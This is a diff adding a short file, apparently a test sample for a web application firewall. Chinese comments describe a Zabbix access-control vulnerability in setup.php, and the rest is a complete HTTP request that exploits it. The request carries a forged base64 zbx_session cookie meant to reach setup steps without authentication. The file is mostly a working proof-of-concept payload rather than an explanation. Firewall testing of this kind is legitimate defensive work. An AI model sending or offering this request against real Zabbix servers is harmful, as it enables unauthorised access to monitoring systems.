@@ -1,0 +1,11 @@
+# Zabbix Sia Zabbix 访问控制错误漏洞
+# Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。
+# Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。
+GET /zabbix/setup.php?acid=80001495&bid=hd_tag_m8mv261p HTTP/1.1
+Host: www.swaf.com
+Cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
+RM-PRO-BusinessID: hd_tag_m8mv261p
+RM-PRO-Token: f2a38e734c2b350edb8ef0ffc7b6ba2f
+RM-PRO-Time: 1742808528245
+User-Agent: curl/7.83.1
+
